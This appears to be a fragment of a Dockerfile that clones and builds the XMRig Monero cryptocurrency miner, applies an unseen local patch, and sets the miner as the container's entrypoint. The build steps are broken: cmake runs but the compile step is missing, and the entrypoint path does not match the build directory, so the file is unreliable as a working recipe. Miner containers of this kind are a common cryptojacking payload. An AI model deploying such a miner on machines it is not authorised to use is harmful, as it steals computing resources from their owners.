RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig.git
WORKDIR /root/xmrig
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake ..
ENTRYPOINT ["./xmrig"]
